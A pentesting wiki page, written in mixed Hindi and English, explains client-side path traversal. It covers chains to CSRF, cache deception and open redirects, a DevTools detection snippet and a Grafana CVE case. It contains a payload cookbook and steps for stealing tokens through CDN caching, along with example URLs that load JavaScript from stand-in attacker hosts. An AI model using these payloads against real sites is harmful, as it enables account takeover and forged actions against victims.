# Client Side Path Traversal

{{#include ../banners/hacktricks-training.md}}

## बुनियादी जानकारी

A client side path traversal तब होता है जब आप **manipulate the path of a URL** कर सकें जो किसी user को legit तरीके से visit करने के लिए भेजा जा रहा हो या जिसे कोई user किसी तरह से visit करने के लिए force किया जा रहा हो, उदाहरण के लिए via JS या CSS। CSPT is also known as **On-Site Request Forgery (OSRF)** क्योंकि यह आपको victim’s browser को उसी origin पर उनके cookies, JWTs, या mTLS certificates के साथ arbitrary paths पर पहुँचाने के लिए मजबूर करने देता है।

Typical sources (data you control):

- Route parameters जो `fetch()` या XHR paths में concatenated होते हैं (React Router, Next.js dynamic routes, Vue router params, Angular `ActivatedRoute`)।
- Stored values (profile slugs, document IDs) जो background jobs, service workers, या WebSocket URLs के अंदर paths में interpolate होते हैं।
- UI gadgets (download/export buttons, image galleries) जो request भेजने से पहले API endpoints में user-controlled fragments या file extensions append कर देते हैं।

Typical sinks (where the traversal lands):

- Frontend API wrappers जो `/api/` या `/proxy/` prepend करते हैं और auth headers को automatically reuse करते हैं।
- `history.pushState` / `router.navigate` helpers जो बाद में hydration के दौरान URLs को reconstruct करते हैं।
- `<link>`/`<style>`/`@import` statements जो CMS content या feature-flag payloads से generate होते हैं।

### Common impacts & chains

- **CSPT ➜ CSRF/OSRF**: intended resource path से escape करके authenticated `POST/PUT/DELETE` calls hijack करें, फिर sensitive endpoints (password reset, payment approval, access revocation) पर फिर से प्रवेश करें। escalate करने के लिए [CSRF](csrf-cross-site-request-forgery.md) checklist के साथ combine करें।
- **CSPT ➜ cache deception / poisoning**: attacker-controlled JSON को public CDN keys से serve कर के उसे unauthenticated तरीके से replay करें। इसके लिए देखें [Cache Poisoning and Cache Deception](cache-deception/README.md)।
- **CSPT ➜ Open Redirect ➜ XSS/SSRF**: traversal किसी open redirect endpoint पर land करता है, जो फिर attacker infrastructure पर bounce करता है जो malicious JS या SSRF payloads serve करता है। [Open Redirect](open-redirect.md) abuses के साथ chain करें।

### Example findings

- In [**this writeup**](https://erasec.be/blog/client-side-path-manipulation/), यह संभव था कि **change the invite URL** ताकि वह अंततः **canceling a card** कर दे।
- In [**this writeup**](https://mr-medi.github.io/research/2022/11/04/practical-client-side-path-traversal-attacks.html), यह संभव था कि **client side path traversal via CSS** (जहाँ यह नियंत्रित किया जा सकता था कि CSS resource किस path से load हो) को एक **open redirect** के साथ combine कर के CSS resource को एक **attacker controlled domain** से load कराया जाए।
- In [**this writeup**](https://blog.doyensec.com/2024/07/02/cspt2csrf.html), एक technique दिखाई गई है कि किस तरह CSPT को abuse करके **CSRF attack** perform किया जा सकता है। यह उस तरीके से किया जाता है जिसमें attacker द्वारा control किए जा सकने वाले सभी data (URL path, parameters, fragment, DB में inject किया गया data...) और उन sinks की निगरानी की जाती है जहाँ यह data पहुँचता है (requests being performed)।
- इसे monitor करने के लिए [**this browser extension**](https://addons.mozilla.org/en-US/firefox/addon/eval-villain/) देखें।
- इस technique को try करने के लिए [**CSPT playground**](https://github.com/doyensec/CSPTPlayground) देखें।
- ब्राउज़र extension को playground में कैसे उपयोग करें यह जानने के लिए [**this tutorial**](https://blog.doyensec.com/2024/12/03/cspt-with-eval-villain.html) देखें।

## CSPT-assisted web cache poisoning/deception

CSPT को extension-based CDN caching के साथ chain करके authenticated API calls द्वारा leak हुए sensitive JSON को exfiltrate किया जा सकता है:

- एक frontend user-controlled input को API path में जोड़ता है और fetch/XHR में authentication headers attach करता है।
- dot-segments (../) inject करके आप authenticated request को उसी origin पर किसी दूसरे endpoint पर retarget कर सकते हैं।
- अगर वह endpoint (या किसी static-looking suffix जैसे .css वाला path variant) CDN द्वारा auth headers पर vary किए बिना cache किया जाता है, तो victim’s authenticated response को public cache key के तहत store किया जा सकता है और कोई भी उसे retrieve कर सकता है।

त्वरित विधि:

1) SPA code खोजें जो path parameters से API URLs बनाता है जबकि auth headers भेजे जा रहे हों।
2) sensitive endpoints की पहचान करें और यह टेस्ट करें कि static suffixes (.css, .js, .jpg, .json) पर CDN क्या behavior करता है — क्या वह Cache-Control: public/max-age और X-Cache: Hit पर switch करके JSON return करता है।
3) victim को उस URL पर लुभाएँ जो SPA parameter में traversal inject करता है ताकि authenticated fetch cacheable path variant को hit करे (उदाहरण के लिए, ../../../v1/token.css)।
4) वही URL anonymously पढ़कर cached secret प्राप्त करें (token → ATO)।

विवरण और mitigations के लिए Cache Deception पेज देखें: [Cache Poisoning and Cache Deception](cache-deception/README.md)।

## Hunting workflow & tooling

### Passive discovery with intercepting proxies

- **Correlate sources/sinks automatically**: [CSPT Burp extension](https://github.com/doyensec/CSPTBurpExtension) आपका proxy history parse करती है, उन parameters को cluster करती है जो बाद में दूसरी requests’ paths के अंदर reflect होते हैं, और canary tokens के साथ proof-of-concept URLs reissue कर सकती है ताकि exploitable traversals confirm हो सकें। JAR load करने के बाद, `Source Scope` को client parameters (उदा., `id`, `slug`) पर सेट करें और `Sink Methods` को `GET, POST, DELETE` पर सेट करें ताकि extension dangerous request builders को highlight कर सके। आप सभी suspect sources को embedded canary के साथ export करके bulk में validate कर सकते हैं।
- **Look for double-URL-decoding**: Burp या ZAP के साथ browse करते समय `/api/%252e%252e/` patterns के लिए ध्यान दें जो frontend द्वारा network पर जाने से पहले normalize हो जाते हैं — ये अक्सर base64-encoded JSON bodies के रूप में दिखते हैं जो route state को reference करते हैं और automated scanner के बिना आसानी से overlook हो जाते हैं।

### Instrumenting SPA sinks manually

DevTools में एक छोटा सा snippet डालने से UI के साथ interact करते समय hidden traversals surface करने में मदद मिलती है:
```javascript
(() => {
const origFetch = window.fetch;
window.fetch = async function (input, init) {
if (typeof input === "string" && /\.\.\//.test(input)) {
console.log("[CSPT candidate]", input, init?.method || "GET");
debugger;
}
return origFetch.apply(this, arguments);
};
})();
```
- Add similar wrappers around `XMLHttpRequest.prototype.open`, `history.pushState`, and framework-specific routers (e.g., `next/router`). Watching for `init.credentials === "include"` quickly narrows down requests that carry session cookies.
- If the app stores routing hints in IndexedDB/localStorage, edit those entries with traversal payloads and reload—the mutated state is often reinjected into requests pre-hydration.

### लैब और payload का अभ्यास

- Spin up the CSPT Playground via `docker compose up` and practice chaining traversal ➜ CSRF ➜ stored XSS flows without touching the target. Reproducing the target’s router structure locally makes it easier to craft shareable PoCs.
- Maintain a scratchpad of successful dot-segment variations (`..;/`, `%2e%2e/`, `%2e./%2e/`, UTF-8 homoglyphs) and suffix tricks (`.css`, `.json`, `;` matrix params) you observed during recon so you can replay them quickly when a new sink appears.

## हाल ही के केस स्टडी (2025)

- **Grafana OSS CVE-2025-4123/6023 (v11.5.0+)** – `/public/plugins/` के अंदर एक traversal gadget ने attackers को plugin asset loader में `../../` smuggle करने की अनुमति दी, इसे Grafana’s open redirect के साथ chain कर के victims को attacker-controlled plugin bundles लोड करने के लिए मजबूर किया जा सकता था। जब anonymous dashboards सक्षम थे, तो एक crafted URL जैसे `https://grafana.example.com/public/plugins/../../../../..//evil.com/poc/module.js` ब्राउज़र द्वारा remote JavaScript के execute होने का कारण बना; यदि Image Renderer plugin इंस्टॉल था, तो वही primitive rendering requests को internal hosts की ओर redirect कर के SSRF में बदल सकता था। हमेशा plugin asset paths, anonymous dashboards, और renderer endpoints को साथ में टेस्ट करें क्योंकि एक single traversal अक्सर आपको दोनों XSS और SSRF के रास्ते दे देता है।

## Payload cookbook

| लक्ष्य | Payload पैटर्न | नोट्स |
| --- | --- | --- |
| Hit sibling API under same origin | `?doc=../../v1/admin/users` | जब routers केवल `/${doc}` को concatenate करते हों तो काम करता है। Add `.json` if CDN only caches static-looking assets. |
| Force SPA to follow open redirect | `?next=..%2f..%2f..%2flogin/callback/%3FreturnUrl=https://attacker.tld/x` | target की codebase में सूचीबद्ध trusted redirectors के साथ combine करें। Chain with [Open Redirect](open-redirect.md). |
| Abuse extension-based CDN cache | `?file=../../v1/token.css` | CDN may treat `.css` as static and cache secrets returned as JSON. |
| CSRF via verb change | `?action=../../payments/approve/.json&_method=POST` | कुछ routers `_method` overrides स्वीकार करते हैं; traversal के साथ जोड़े ताकि destructive endpoints को re-target किया जा सके। |

## References

- [Cache Deception + CSPT: Turning Non Impactful Findings into Account Takeover](https://zere.es/posts/cache-deception-cspt-account-takeover/)
- [CSPT overview by Matan Berson](https://matanber.com/blog/cspt-levels/)
- [PortSwigger: Web Cache Deception](https://portswigger.net/web-security/web-cache-deception)
- [Grafana CVE-2025-4123 Chained Path Traversal + Open Redirect Analysis](https://www.cve.news/cve-2025-4123/)
- [Doyensec CSPT Burp Extension](https://github.com/doyensec/CSPTBurpExtension)

{{#include ../banners/hacktricks-training.md}}
